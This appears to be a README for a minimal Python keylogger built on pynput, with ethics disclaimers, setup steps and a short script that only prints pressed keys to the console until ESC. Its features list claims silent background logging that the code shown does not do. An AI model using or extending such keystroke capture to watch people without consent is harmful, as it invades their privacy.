Keylogger (Educational Purpose Only)

A simple **Keylogger** written in Python using the `pynput` library to capture and log keystrokes. This project is intended for **educational and ethical use only**, such as learning about input handling and monitoring system behavior.

Disclaimer: This tool is for educational use only. Do **not** use it on systems without **explicit permission**. Unauthorized monitoring is illegal and unethical.

Antivirus Warning
Since keyloggers are often flagged as malicious tools, this script may trigger antivirus software. If using for educational purposes, make sure to run in a controlled or virtual environment.

##Features
- Logs all keystrokes in real time
- Can be run in the background silently
- Supports stopping the keylogger with `ESC` key
- Lightweight and simple Python script

##Sample Code (keylogger.py)
from pynput.keyboard import Key, Listener
def on_press(key):
    print(f"{key} pressed")
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

## 🛠️ Setup Instructions

# Step 1: Create a virtual environment named 'venv'
python3 -m venv venv

# Step 2: Activate the virtual environment
source venv/bin/activate

# Step 3: Install pynput inside the virtual environment
pip install pynput

# step 4: save the code
nano keylogger.py 

# step 4: Run the script with
python keylogger.py


Note
Do not use this on anyone else's computer.
Respect privacy and ethical boundaries.
Learn responsibly.
